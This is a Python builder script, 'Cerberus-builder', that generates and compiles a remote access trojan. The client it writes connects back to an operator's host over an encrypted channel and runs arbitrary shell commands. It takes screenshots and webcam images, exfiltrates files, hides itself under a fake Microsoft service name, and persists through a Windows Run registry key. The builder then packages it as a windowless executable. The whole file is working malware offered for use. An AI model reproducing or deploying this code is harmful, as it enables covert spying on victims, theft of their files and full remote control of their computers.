import os
import argparse

parser = argparse.ArgumentParser(prog='Cerberus-builder', description='Build client with given parameters', usage='builder.py -s [host] -p [port]')
parser.add_argument('-s', '--server', required=True, dest='host', help='Your Cerberus server IP address')
parser.add_argument('-p', '--port', required=True, dest='port', help='Your Cerberus port')
parser.add_argument('-f', '--file', required=True, dest='file', help='Where to save the file')

args = vars(parser.parse_args())
host = args['host']
port = args['port']
file = args['file']

code = r"""import socket
import cv2
import os
import time
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from PIL import Image, ImageGrab

PACKAGE_SIZE = 9999
HOST_ADDRESS = '%h'
HOST_PORT = %p


def connect_to_host():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    public = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
    host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host.connect((HOST_ADDRESS, HOST_PORT))
    host.send(public)
    fernet_key = private_key.decrypt(host.recv(1024), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    fernet = Fernet(fernet_key)
    receive_commands(host, fernet)


def send_data(data, connection, fernet):
    if type(data) is str:
        data = data.encode()
    size = len(data)
    connection.send(fernet.encrypt(str(size).encode()))
    iterations = size // PACKAGE_SIZE
    if size % PACKAGE_SIZE != 0:
        iterations += 1
    for i in range(0, iterations):
        if len(data) >= PACKAGE_SIZE:
            to_send = data[:PACKAGE_SIZE + 1]
            data = data[PACKAGE_SIZE + 1:]
        else:
            to_send = data
        connection.send(fernet.encrypt(to_send))
        connection.recv(1024)


def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(temp_path + 'pic_scr.png')
    file = open(temp_path + 'pic_scr.png', 'rb')
    data = file.read()
    file.close()
    os.remove(temp_path + 'pic_scr.png')
    return data


def webcam():
    camera = cv2.VideoCapture(0)
    for i in range(30):
        camera.read()
    r, image = camera.read()
    cv2.imwrite(temp_path + 'pic_cam.png', image)
    data = open(temp_path + 'pic_cam.png', 'rb').read()
    os.remove(temp_path + 'pic_cam.png')
    return data


def receive_commands(host, fernet):
    while True:
        cmd = fernet.decrypt(host.recv(1024)).decode()
        if cmd == 'screenshot':
            data = screenshot()
        elif cmd == 'webcam':
            data = webcam()
        elif cmd[:3] == 'get':
            path = list(cmd.split())[1]
            file = open(path, 'rb')
            data = file.read()
            file.close()
        elif cmd == 'platform':
            data = sys.platform.encode()
        else:
            data = os.popen(cmd).read()
        send_data(data, host, fernet)


if sys.platform == 'win32':
    import winreg
    temp_path = f'{os.environ["USERPROFILE"]}\\AppData\\Local\\Temp\\'
    os.popen('mkdir "%USERPROFILE%\\AppData\\Local\\Microsoft Local Services"')
    os.popen(f'copy {sys.argv[0]} "%USERPROFILE%\\AppData\\Local\\Microsoft Local Services\\Microsoft Local Service Support.exe"')
    os.popen(f'attrib +h "%USERPROFILE%\\AppData\\Local\\Microsoft Local Services\\Microsoft Local Service Support.exe"')
    os.popen(f'attrib +h "%USERPROFILE%\\AppData\\Local\\Microsoft Local Services"')
    path = "%USERPROFILE%\\AppData\\Local\\Microsoft Local Services\\Microsoft Local Service Support.exe"
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    reg_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(reg_key, "Microsoft Local Services", 0, winreg.REG_SZ, path)
    winreg.CloseKey(reg_key)
else:
    temp_path = f'{os.environ["HOME"]}/'


while True:
    try:
        connect_to_host()
    except:
        time.sleep(5)

""".replace('%h', host).replace('%p', port)

print(f'\033[1;97mWriting generated python code to {file}...')
open(file, 'w').write(code)
print('Trying to generate executable...\033[0m')
try:
    os.system('pip install pyinstaller --upgrade')
    os.system(f'pyinstaller --onefile --noconsole -i "NONE" {file}')
    print('\033[1;92mExecutable generated successfully!\033[0m')
except:
    print('\033[1;93mWarning: Attempt to generate executable failed!\033[0m')
print('\033[1;5;92mCompleted!\033[0m')
